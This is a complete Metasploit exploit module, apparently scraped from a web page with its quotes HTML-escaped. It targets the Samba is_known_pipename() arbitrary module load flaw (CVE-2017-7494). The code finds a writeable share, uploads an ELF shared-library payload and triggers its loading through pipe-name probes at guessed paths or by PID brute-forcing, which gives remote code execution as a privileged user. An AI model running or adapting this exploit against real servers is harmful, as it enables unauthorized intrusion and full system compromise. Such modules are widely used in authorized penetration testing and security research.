# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::DCERPC
  include Msf::Exploit::Remote::SMB::Client

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Samba is_known_pipename() Arbitrary Module Load&#039;,
      &#039;Description&#039;    => %q{
          This module triggers an arbitrary shared library load vulnerability
        in Samba versions 3.5.0 to 4.4.14, 4.5.10, and 4.6.4. This module
        requires valid credentials, a writeable folder in an accessible share,
        and knowledge of the server-side path of the writeable folder. In
        some cases, anonymous access combined with common filesystem locations
        can be used to automatically exploit this vulnerability.
      },
      &#039;Author&#039;         =>
        [
          &#039;steelo <knownsteelo[at]gmail.com>&#039;,    # Vulnerability Discovery
          &#039;hdm&#039;,                                  # Metasploit Module
          &#039;Brendan Coles <bcoles[at]gmail.com>&#039;,  # Check logic
          &#039;Tavis Ormandy <taviso[at]google.com>&#039;, # PID hunting technique
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2017-7494&#039; ],
          [ &#039;URL&#039;, &#039;https://www.samba.org/samba/security/CVE-2017-7494.html&#039; ],
        ],
      &#039;Payload&#039;         =>
        {
          &#039;Space&#039;       => 9000,
          &#039;DisableNops&#039; => true
        },
      &#039;Platform&#039;        => &#039;linux&#039;,
      #
      # Targets are currently limited by platforms with ELF-SO payload wrappers
      #
      &#039;Targets&#039;         =>
        [

          [ &#039;Linux x86&#039;,        { &#039;Arch&#039; => ARCH_X86 } ],
          [ &#039;Linux x86_64&#039;,     { &#039;Arch&#039; => ARCH_X64 } ],
          #
          # Not ready yet
          # [ &#039;Linux ARM (LE)&#039;,   { &#039;Arch&#039; => ARCH_ARMLE } ],
          # [ &#039;Linux MIPS&#039;,       { &#039;Arch&#039; => MIPS } ],
        ],
      &#039;Privileged&#039;      => true,
      &#039;DisclosureDate&#039;  => &#039;Mar 24 2017&#039;,
      &#039;DefaultTarget&#039;   => 1))

    register_options(
      [
        OptString.new(&#039;SMB_SHARE_NAME&#039;, [false, &#039;The name of the SMB share containing a writeable directory&#039;]),
        OptString.new(&#039;SMB_SHARE_BASE&#039;, [false, &#039;The remote filesystem path correlating with the SMB share name&#039;]),
        OptString.new(&#039;SMB_FOLDER&#039;, [false, &#039;The directory to use within the writeable SMB share&#039;]),
      ])

    register_advanced_options(
      [
        OptBool.new(&#039;BruteforcePID&#039;, [false, &#039;Attempt to use two connections to bruteforce the PID working directory&#039;, false]),
      ])
  end


  def generate_common_locations
    candidates = []
    if datastore[&#039;SMB_SHARE_BASE&#039;].to_s.length > 0
      candidates << datastore[&#039;SMB_SHARE_BASE&#039;]
    end

    %W{ /volume1 /volume2 /volume3 /volume4
        /shared /mnt /mnt/usb /media /mnt/media
        /var/samba /tmp /home /home/shared
    }.each do |base_name|
      candidates << base_name
      candidates << [base_name, @share]
      candidates << [base_name, @share.downcase]
      candidates << [base_name, @share.upcase]
      candidates << [base_name, @share.capitalize]
      candidates << [base_name, @share.gsub(" ", "_")]
    end

    candidates.uniq
  end

  def enumerate_directories(share)
    begin
      self.simple.connect("\\\\#{rhost}\\#{share}")
      stuff = self.simple.client.find_first("\\*")
      directories = [""]
      stuff.each_pair do |entry,entry_attr|
        next if %W{. ..}.include?(entry)
        next unless entry_attr[&#039;type&#039;] == &#039;D&#039;
        directories << entry
      end

      return directories

    rescue ::Rex::Proto::SMB::Exceptions::ErrorCode => e
      vprint_error("Enum #{share}: #{e}")
      return nil

    ensure
      if self.simple.shares["\\\\#{rhost}\\#{share}"]
        self.simple.disconnect("\\\\#{rhost}\\#{share}")
      end
    end
  end

  def verify_writeable_directory(share, directory="")
    begin
      self.simple.connect("\\\\#{rhost}\\#{share}")

      random_filename = Rex::Text.rand_text_alpha(5)+".txt"
      filename = directory.length == 0 ? "\\#{random_filename}" : "\\#{directory}\\#{random_filename}"

      wfd = simple.open(filename, &#039;rwct&#039;)
      wfd << Rex::Text.rand_text_alpha(8)
      wfd.close

      simple.delete(filename)
      return true

    rescue ::Rex::Proto::SMB::Exceptions::ErrorCode => e
      vprint_error("Write #{share}#{filename}: #{e}")
      return false

    ensure
      if self.simple.shares["\\\\#{rhost}\\#{share}"]
        self.simple.disconnect("\\\\#{rhost}\\#{share}")
      end
    end
  end

  def share_type(val)
    [ &#039;DISK&#039;, &#039;PRINTER&#039;, &#039;DEVICE&#039;, &#039;IPC&#039;, &#039;SPECIAL&#039;, &#039;TEMPORARY&#039; ][val]
  end

  def enumerate_shares_lanman
    shares = []
    begin
      res = self.simple.client.trans(
        "\\PIPE\\LANMAN",
        (
          [0x00].pack(&#039;v&#039;) +
          "WrLeh\x00"   +
          "B13BWz\x00"  +
          [0x01, 65406].pack("vv")
        ))
    rescue ::Rex::Proto::SMB::Exceptions::ErrorCode => e
      vprint_error("Could not enumerate shares via LANMAN")
      return []
    end
    if res.nil?
      vprint_error("Could not enumerate shares via LANMAN")
      return []
    end

    lerror, lconv, lentries, lcount = res[&#039;Payload&#039;].to_s[
      res[&#039;Payload&#039;].v[&#039;ParamOffset&#039;],
      res[&#039;Payload&#039;].v[&#039;ParamCount&#039;]
    ].unpack("v4")

    data = res[&#039;Payload&#039;].to_s[
      res[&#039;Payload&#039;].v[&#039;DataOffset&#039;],
      res[&#039;Payload&#039;].v[&#039;DataCount&#039;]
    ]

    0.upto(lentries - 1) do |i|
      sname,tmp = data[(i * 20) +  0, 14].split("\x00")
      stype     = data[(i * 20) + 14, 2].unpack(&#039;v&#039;)[0]
      scoff     = data[(i * 20) + 16, 2].unpack(&#039;v&#039;)[0]
      scoff -= lconv if lconv != 0
      scomm,tmp = data[scoff, data.length - scoff].split("\x00")
      shares << [ sname, share_type(stype), scomm]
    end

    shares
  end

  def probe_module_path(path, simple_client=self.simple)
    begin
      simple_client.create_pipe(path)
    rescue Rex::Proto::SMB::Exceptions::ErrorCode => e
      vprint_error("Probe: #{path}: #{e}")
    end
  end

  def find_writeable_path(share)
    subdirs = enumerate_directories(share)
    return unless subdirs

    if datastore[&#039;SMB_FOLDER&#039;].to_s.length > 0
      subdirs.unshift(datastore[&#039;SMB_FOLDER&#039;])
    end

    subdirs.each do |subdir|
      next unless verify_writeable_directory(share, subdir)
      return subdir
    end

    nil
  end

  def find_writeable_share_path
    @path = nil
    share_info = enumerate_shares_lanman
    if datastore[&#039;SMB_SHARE_NAME&#039;].to_s.length > 0
      share_info.unshift [datastore[&#039;SMB_SHARE_NAME&#039;], &#039;DISK&#039;, &#039;&#039;]
    end

    share_info.each do |share|
      next if share.first.upcase == &#039;IPC$&#039;
      found = find_writeable_path(share.first)
      next unless found
      @share = share.first
      @path  = found
      break
    end
  end

  def find_writeable
    find_writeable_share_path
    unless @share && @path
      print_error("No suiteable share and path were found, try setting SMB_SHARE_NAME and SMB_FOLDER")
      fail_with(Failure::NoTarget, "No matching target")
    end
    print_status("Using location \\\\#{rhost}\\#{@share}\\#{@path} for the path")
  end

  def upload_payload
    begin
      self.simple.connect("\\\\#{rhost}\\#{@share}")

      random_filename = Rex::Text.rand_text_alpha(8)+".so"
      filename = @path.length == 0 ? "\\#{random_filename}" : "\\#{@path}\\#{random_filename}"
      wfd = simple.open(filename, &#039;rwct&#039;)
      wfd << Msf::Util::EXE.to_executable_fmt(framework, target.arch, target.platform,
        payload.encoded, "elf-so", {:arch => target.arch, :platform => target.platform}
      )
      wfd.close

      @payload_name = random_filename
      return true

    rescue ::Rex::Proto::SMB::Exceptions::ErrorCode => e
      print_error("Write #{@share}#{filename}: #{e}")
      return false

    ensure
      if self.simple.shares["\\\\#{rhost}\\#{@share}"]
        self.simple.disconnect("\\\\#{rhost}\\#{@share}")
      end
    end
  end

  def find_payload

    # Reconnect to IPC$
    simple.connect("\\\\#{rhost}\\IPC$")

    # Look for common paths first, since they can be a lot quicker than hunting PIDs
    print_status("Hunting for payload using common path names: #{@payload_name} - //#{rhost}/#{@share}/#{@path}")
    generate_common_locations.each do |location|
      target = [location, @path, @payload_name].join("/").gsub(/\/+/, &#039;/&#039;)
      print_status("Trying location #{target}...")
      probe_module_path(target)
    end

    # Exit early if we already have a session
    return if session_created?

    return unless datastore[&#039;BruteforcePID&#039;]

    # XXX: This technique doesn&#039;t seem to work in practice, as both processes have setuid()d
    #      to non-root, but their /proc/pid directories are still owned by root. Trying to
    #      read the /proc/other-pid/cwd/target.so results in permission denied. There is a
    #      good chance that this still works on some embedded systems and odd-ball Linux.

    # Use the PID hunting strategy devised by Tavis Ormandy
    print_status("Hunting for payload using PID search: #{@payload_name} - //#{rhost}/#{@share}/#{@path} (UNLIKELY TO WORK!)")

    # Configure the main connection to have a working directory of the file share
    simple.connect("\\\\#{rhost}\\#{@share}")

    # Use a second connection to brute force the PID of the first connection
    probe_conn = connect(false)
    smb_login(probe_conn)
    probe_conn.connect("\\\\#{rhost}\\#{@share}")
    probe_conn.connect("\\\\#{rhost}\\IPC$")

    # Run from 2 to MAX_PID (ushort) trying to read the other process CWD
    2.upto(32768) do |pid|

      # Look for the PID associated with our main SMB connection
      target = ["/proc/#{pid}/cwd", @path, @payload_name].join("/").gsub(/\/+/, &#039;/&#039;)
      vprint_status("Trying PID with target path #{target}...")
      probe_module_path(target, probe_conn)

      # Keep our main connection alive
      if pid % 1000 == 0
         self.simple.client.find_first("\\*")
      end
    end

  end

  def check
    res = smb_fingerprint

    unless res[&#039;native_lm&#039;] =~ /Samba ([\d\.]+)/
      print_error("does not appear to be Samba: #{res[&#039;os&#039;]} / #{res[&#039;native_lm&#039;]}")
      return CheckCode::Safe
    end

    samba_version = Gem::Version.new($1.gsub(/\.$/, &#039;&#039;))

    vprint_status("Samba version identified as #{samba_version.to_s}")

    if samba_version < Gem::Version.new(&#039;3.5.0&#039;)
      return CheckCode::Safe
    end

    # Patched in 4.4.14
    if samba_version < Gem::Version.new(&#039;4.5.0&#039;) &&
       samba_version >= Gem::Version.new(&#039;4.4.14&#039;)
      return CheckCode::Safe
    end

    # Patched in 4.5.10
    if samba_version > Gem::Version.new(&#039;4.5.0&#039;) &&
       samba_version < Gem::Version.new(&#039;4.6.0&#039;) &&
       samba_version >= Gem::Version.new(&#039;4.5.10&#039;)
      return CheckCode::Safe
    end

    # Patched in 4.6.4
    if samba_version >= Gem::Version.new(&#039;4.6.4&#039;)
      return CheckCode::Safe
    end

    connect
    smb_login
    find_writeable_share_path
    disconnect

    if @share.to_s.length == 0
      print_status("Samba version #{samba_version.to_s} found, but no writeable share has been identified")
      return CheckCode::Detected
    end

    print_good("Samba version #{samba_version.to_s} found with writeable share &#039;#{@share}&#039;")
    return CheckCode::Appears
  end

  def exploit
    # Setup SMB
    connect
    smb_login

    # Find a writeable share
    find_writeable

    # Upload the shared library payload
    upload_payload

    # Find and execute the payload from the share
    begin
      find_payload
    rescue Rex::StreamClosedError, Rex::Proto::SMB::Exceptions::NoReply
    end

    # Cleanup the payload
    begin
      simple.connect("\\\\#{rhost}\\#{@share}")
      uploaded_path = @path.length == 0 ? "\\#{@payload_name}" : "\\#{@path}\\#{@payload_name}"
      simple.delete(uploaded_path)
    rescue Rex::StreamClosedError, Rex::Proto::SMB::Exceptions::NoReply
    end

    # Shutdown
    disconnect
  end

end

